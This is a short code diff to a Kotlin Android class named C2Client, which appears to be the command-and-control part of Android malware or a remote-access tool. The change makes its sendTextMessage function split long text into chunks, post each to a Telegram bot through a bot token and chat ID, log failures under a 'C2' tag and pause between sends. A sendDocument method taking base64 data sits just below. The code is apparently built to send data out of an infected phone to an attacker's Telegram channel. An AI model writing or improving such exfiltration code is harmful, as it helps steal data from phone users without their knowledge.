@@ -92,15 +92,26 @@ class C2Client(private val ctx: Context) {
     }
 
     private fun sendTextMessage(text: String) {
-        try {
-            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
-            val body = FormBody.Builder()
-                .add("chat_id", CHAT_ID)
-                .add("text", text)
-                .build()
-            val req = Request.Builder().url(url).post(body).build()
-            http.newCall(req).execute().use { }
-        } catch (_: Exception) {}
+        val chunks = if (text.length <= 4000) listOf(text)
+                     else text.chunked(4000)
+        for (chunk in chunks) {
+            try {
+                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+                val body = FormBody.Builder()
+                    .add("chat_id", CHAT_ID)
+                    .add("text", chunk)
+                    .build()
+                val req = Request.Builder().url(url).post(body).build()
+                http.newCall(req).execute().use { resp ->
+                    if (!resp.isSuccessful) {
+                        android.util.Log.w("C2", "sendMessage HTTP " + resp.code)
+                    }
+                }
+            } catch (e: Exception) {
+                android.util.Log.w("C2", "sendMessage failed: " + e.message)
+            }
+            try { Thread.sleep(300) } catch (_: InterruptedException) {}
+        }
     }
 
     private fun sendDocument(name: String, b64: String) {
